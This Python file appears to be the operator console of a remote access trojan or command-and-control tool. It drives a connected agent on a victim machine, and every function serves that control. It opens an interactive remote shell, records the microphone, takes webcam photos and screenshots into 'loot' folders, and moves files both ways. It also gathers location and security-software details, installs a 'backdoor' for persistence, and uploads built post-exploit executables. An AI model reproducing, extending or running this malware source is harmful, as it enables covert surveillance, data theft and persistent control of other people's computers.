from .system import system
from .options import *
from core.server.async_comm import send_data, recv_data
from core.utils.paths import ensure_project_dir, get_project_path
from colorama import Fore
from agent.post_exploit.post_exploit_controller import PostExploitController
from api.connection_protocol import create_task
import random, os, simplejson

post_exploit_controller = PostExploitController()


def send_task(conn, address, module, action, args=None):
    """Send a JSON task to the agent using the connection protocol."""
    session_id = f"{address[0]}:{address[1]}" if address else ""
    task = create_task(session_id, module, action, args or {})
    # send_data accepts str and will encode
    send_data(conn, task)


def send_notification(conn, address):
    title = "Title"
    message = "Message"
    app = "App"
    while True:
        system.clear_screen()
        system.printheader()
        print(Fore.LIGHTCYAN_EX + options.notification_options)
        command = system.input(10)
        if command == "1":
            title = system.input(7)
        elif command == "2":
            message = system.input(8)
        elif command == "3":
            app = system.input(9)
        elif command == "4":
            try:
                send_task(conn, address, "notification", "send", {"title":title, "message":message, "app":app})
            except Exception as e:
                print(Fore.LIGHTRED_EX + f'[!] Error: {e}')
                input("OK")
            
            break
        elif command == "9": break
    
    input("OK")

def json_receive(conn):
    try:
        raw_data = recv_data(conn)
        if not raw_data:
            return {}
        return simplejson.loads(raw_data)
    except Exception as e:
        print(Fore.LIGHTRED_EX + f"[!] JSON Receive Error: {e}")
        return {}

def json_send(conn, data):
    try:
        json_data = simplejson.dumps(data)
        send_data(conn, json_data.encode("utf-8"))
    except Exception as e: 
        input("OK")
        print(Fore.LIGHTRED_EX + f'[!] Error: {e}')

def geo(conn, address):
    send_task(conn, address, "geo", "get")
    try:
        resp = json_receive(conn)
        data = resp.get('result') if isinstance(resp, dict) and 'result' in resp else resp
    except Exception:
        data = {}
    print(Fore.LIGHTCYAN_EX + "[+] Location Info:\n", data)
    input("OK")

def secinfo(conn, address):
    send_task(conn, address, "secinfo", "get")
    try:
        resp = json_receive(conn)
        data = resp.get('result') if isinstance(resp, dict) and 'result' in resp else resp
    except Exception:
        data = {}
    options.printSecurityInfoText(data)
    input("OK")

def sysinfo(conn, address):
    send_task(conn, address, "sysinfo", "get")
    try:
        resp = json_receive(conn)
        data = resp.get('result') if isinstance(resp, dict) and 'result' in resp else resp
    except Exception:
        data = {}
    print(options.getSystemInfoText(data))
    input("OK")

def mic(conn, address):
    records_dir = ensure_project_dir("storage", "loot", "records")
    number = random.randint(0, 9999999)
    print(Fore.LIGHTCYAN_EX + "[+] Info: Starting")
    send_data(conn, b"MODE_MIC")
    data = recv_data(conn, decode=False)
    output_path = os.path.join(records_dir, f"record{number}.wav")
    with open(output_path, "wb") as f:
        f.write(data)
    print(Fore.LIGHTCYAN_EX + f"[+] Recorded Mic: {output_path}")
    input("OK")
def getInput(conn):
    send_data(conn, b"SHELLINFO")
    return recv_data(conn)
def shell(conn, address):
    send_data(conn, b"MODE_SHELL")
    try:
        while True:
            send_data(conn, b"SHELLINFO")
            prompt_text = recv_data(conn)
            cmd = input(prompt_text)
            if not cmd.strip():
                continue
            if cmd == 'exit':
                system.clear_screen()
                send_data(conn, b"exit")
                break
            send_data(conn, cmd.encode())
            if cmd == 'clear':
                system.clear_screen()
            try:
                output = recv_data(conn)
                print(Fore.LIGHTGREEN_EX + output)
            except Exception as e:
                print(Fore.LIGHTRED_EX + f"[!] Error: {e}")
                input("OK")
                break
    except Exception as e:
        print(Fore.LIGHTRED_EX + f"[!] Error In Shell Mode: {e}")
        input("OK")

def upload(conn, address, path=None, name=None, usename=True, send_mode=True):
    path = path or input("File Path: ")
    if usename: name = name or input("Destination File Name: ")
        
    try:
        with open(path, 'rb') as f:
            data = f.read()
        if send_mode: send_data(conn, b"MODE_UPLOAD")
        if usename: send_data(conn, name.encode())

        if send_mode: control = recv_data(conn)
        send_data(conn, data)
        print(Fore.LIGHTCYAN_EX + "[+] File Uploaded")
    except Exception as error:
        print(Fore.LIGHTRED_EX + f"[!] Error: {error}")
        input("OK")
    if send_mode: input("OK")
    
def download(conn, address):
    send_data(conn, b"MODE_DOWNLOAD")
    path = input("File Path: ")
    name = input("Destination File Name: ")
    send_data(conn, path.encode())
    try:
        send_data(conn, b'control')

        data = recv_data(conn, decode=False)
        with open(name, 'wb') as f:
            f.write(data)
    except Exception as error: 
        print(Fore.LIGHTRED_EX + f"[!] Error: {error}")
        input("OK")
    input("OK")

def cam(conn, address):
    photos_dir = ensure_project_dir("storage", "loot", "photos")
    number = random.randint(0, 9999999)
    print(Fore.LIGHTCYAN_EX + "[+] Info: Starting")
    send_data(conn, b"MODE_CAM")
    data = recv_data(conn, decode=False)
    output_path = os.path.join(photos_dir, f"photo{number}.jpg")
    with open(output_path, "wb") as f:
        f.write(data)
    print(Fore.LIGHTCYAN_EX + f"[+] Taked Photo: {output_path}")
    input("OK")

def screenshot(conn, address):
    photos_dir = ensure_project_dir("storage", "loot", "photos")
    try:
        number = random.randint(0, 9999999)
        print(Fore.LIGHTCYAN_EX + "[+] Info: Starting")
        send_data(conn, b"MODE_SCREENSHOT")
        data = recv_data(conn, decode=False)
        output_path = os.path.join(photos_dir, f"screenshot{number}.jpg")
        with open(output_path, "wb") as f:
            f.write(data)
        print(Fore.LIGHTCYAN_EX + f"[+] Screenshot: {output_path}")
    except Exception as e: 
        print(e)
        input("OK")
    input("OK")

def backdoor(conn, address):
    send_task(conn, address, "system", "backdoor")
    try:
        resp = json_receive(conn)
    except Exception:
        resp = None
    print(Fore.LIGHTCYAN_EX + f"[+] Created Persistence")
    input("OK")

def delete(conn, address):
    send_task(conn, address, "system", "delete")
    try:
        resp = json_receive(conn)
    except Exception:
        resp = None
    print(Fore.LIGHTCYAN_EX + "[+] Destroyed Persistence")
    input("OK")

def agentinfo(conn, address):
    print(Fore.LIGHTGREEN_EX + f"IP : {address[0]} PORT : {str(address[1])}")
    input("OK")

def edit_template_placeholders(module_entry):
    placeholders = post_exploit_controller.get_placeholder_tokens(module_entry)
    if not placeholders:
        return {}

    print(Fore.LIGHTCYAN_EX + "[+] Module template placeholders:")
    stored_values = post_exploit_controller.load_template_values(module_entry)
    final_values = {}

    for token, description in placeholders.items():
        current = stored_values.get(token, "")
        label = description if isinstance(description, str) and description else token
        prompt = f"{label} ({token}) [{current}]: "
        user_value = input(prompt).strip()
        if user_value:
            final_values[token] = user_value
        elif current:
            final_values[token] = current

    if final_values:
        post_exploit_controller.save_template_values(module_entry, final_values)
    return final_values


def post_exploit_upload(conn, address, module_entry):
    if not module_entry:
        print(Fore.LIGHTRED_EX + "[-] No module selected")
        input("OK")
        return

    placeholder_values = edit_template_placeholders(module_entry)
    print(Fore.LIGHTCYAN_EX + "[+] Building post-exploit module...")
    payload_path = post_exploit_controller.build_temp_payload(module_entry, placeholder_values, build_type="exe")
    if not payload_path:
        print(Fore.LIGHTRED_EX + "[-] Failed to build post-exploit module")
        input("OK")
        return

    try:
        send_data(conn, b"MODE_REGISTER_POSTEXPLOIT")
        send_data(conn, module_entry["command"].encode())
        recv_data(conn)
        remote_name = f"{module_entry['command'].lower()}.exe"
        send_data(conn, remote_name.encode())
        recv_data(conn)
        upload(conn, address, payload_path, usename=False, send_mode=False)
        response = recv_data(conn)
        if response == "REGISTERED":
            print(Fore.LIGHTGREEN_EX + f"[+] Registered post-exploit: {module_entry['command']}")
        else:
            print(Fore.LIGHTRED_EX + f"[-] Failed to register module: {response}")
    except Exception as e:
        print(Fore.LIGHTRED_EX + f"[-] Error: {e}")
    finally:
        post_exploit_controller.cleanup_temp_payload(payload_path)
    input("OK")


def post_exploit_controller_session(conn, address, module_entry, server_host):
    print("start")
    if not module_entry:
        print(Fore.LIGHTRED_EX + "[-] No module selected")
        input("OK")
        return

    if not post_exploit_controller.module_has_controller(module_entry):
        print(Fore.LIGHTRED_EX + "[-] This module does not expose a controller interface.")
        input("OK")
        return

    port, stop_event, controller_thread = post_exploit_controller.start_module_controller(module_entry, bind_host=server_host)
    if not port or not controller_thread:
        missing = []
        if not port:
            missing.append("port")
        if not controller_thread:
            missing.append("thread")
        print(Fore.LIGHTRED_EX + f"[-] Failed to start module controller listener ({', '.join(missing)})")
        input("OK")
        return

    try:
        send_data(conn, b"MODE_START_POSTEXPLOIT")
        send_data(conn, module_entry["command"].encode())
        response = recv_data(conn)
        if response != "CONTROLLER_STARTED":
            print(Fore.LIGHTRED_EX + f"[-] Failed to start post exploit on agent: {response}")
            stop_event.set()
            controller_thread.join(1)
            input("OK")
            return

        print(Fore.LIGHTCYAN_EX + f"[+] Controller started: {post_exploit_controller.get_controller_label(module_entry)}")
        print(Fore.LIGHTCYAN_EX + f"[+] Waiting for module connection on {server_host}:{port}")
        print(Fore.LIGHTCYAN_EX + "[+] Type 'exit' to stop controller.")

        while controller_thread.is_alive():
            cmd = input("[controller] type 'exit' to close: ").strip()
            if cmd.lower() in ("exit", "quit"):
                break

        stop_event.set()
        controller_thread.join(1)
        print(Fore.LIGHTCYAN_EX + "[+] Controller stopped.")
    except Exception as e:
        print(Fore.LIGHTRED_EX + f"[-] Error in controller session: {e}")
    finally:
        stop_event.set()
        if controller_thread:
            controller_thread.join(1)
    input("OK")


def manage_post_exploits(conn, address, server_host=None):
    post_exploit_controller.refresh_modules()
    module_list = post_exploit_controller.list_modules()
    if not module_list:
        print(Fore.LIGHTRED_EX + "\n[-] No post-exploit modules found in modules/\n")
        input("OK")
        return

    print(Fore.LIGHTCYAN_EX + "\nAvailable post-exploit modules:\n")
    index = 1
    for module_entry in module_list:
        line = f"{Fore.LIGHTCYAN_EX}{index} - {module_entry['command']}"
        if module_entry.get('description'):
            line += f" : {Fore.LIGHTYELLOW_EX}{module_entry['description']}"
        if post_exploit_controller.module_has_controller(module_entry):
            line += f"{Fore.LIGHTGREEN_EX} [Controller Available]"
        print(line + "\n")
        index += 1

    choice = system.input(13).strip()
    if not choice.isdigit():
        print(Fore.LIGHTRED_EX + "[-] Invalid selection")
        input("OK")
        return

    module_index = int(choice) - 1
    if module_index < 0 or module_index >= len(module_list):
        print(Fore.LIGHTRED_EX + "[-] Selection out of range")
        input("OK")
        return

    module_entry = module_list[module_index]

    while True:
        system.clear_screen()
        system.printheader()
        print(Fore.LIGHTBLUE_EX + f"Module: {module_entry['command']}\n")
        print(Fore.LIGHTCYAN_EX + "1 - Upload/Register module")
        if post_exploit_controller.module_has_controller(module_entry):
            print(Fore.LIGHTCYAN_EX + "2 - Open module controller")
        print(Fore.LIGHTCYAN_EX + "9 - Back")

        action = system.input(14).strip()
        if action == "1":
            post_exploit_upload(conn, address, module_entry)
            break
        elif action == "2" and post_exploit_controller.module_has_controller(module_entry):
            post_exploit_controller_session(conn, address, module_entry, server_host)
            break
        elif action == "9":
            break
        else:
            print(Fore.LIGHTRED_EX + "[-] Invalid selection")
            input("OK")

